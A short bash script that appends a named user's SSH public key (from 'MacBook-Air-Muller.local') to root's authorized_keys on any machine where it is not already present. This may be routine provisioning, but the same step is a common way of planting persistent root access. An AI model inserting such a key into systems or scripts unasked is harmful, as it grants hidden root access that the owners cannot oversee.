#!/bin/bash

if [ -e /root ]; then
    if [ $( /bin/grep muller /root/.ssh/authorized_keys | wc -l) == 0 ]; then
        echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDUw+TQeETPayhf0fmOjYnmLh4L9tcaxBxTNL7zJje5uAV2hQo32TBLEJy1MM9OzjP/A64Lov9qS56FoTC5R/w7+AZztKn8SeV9r4c5SXtxijtFrvz2krftl76zU8mk0EjahP0NePqliolKIK02n7jgxrHsIE3nScF323jU2I1o++Y8fKpR46WOLY/X9esFK338++3rvIsJrCoCSV/csV2/3pUZ1IAsrQwhrkqX+q3akxuOLXqAxvJA0iDwAXmPTK8zTwXub3/YkUI0m3Pm4Pi/9HAYr051dkq9x/7GwiMYJoznCncnhPqf9j2N8Ootf0f2yu3KB15NBlfns+Tt3c/JK2/RHV+bbR8Ffg5DezV3pqvy35BxI3vVYkqDXhIqsef6bHkj4Zt8sEBwZ8XwU/E4Px4BxZ9/H04ih5HQEq/DJtV5wbC/v2j6Pt9c7iwUKqkgwGTfHMa/nMCOThNVNATTxIoIc2FTYVvy9H8BRmyvBVeeV8Z7fKv+5XkjzV0cqG8= muller@MacBook-Air-Muller.local" >> /root/.ssh/authorized_keys
    fi
fi
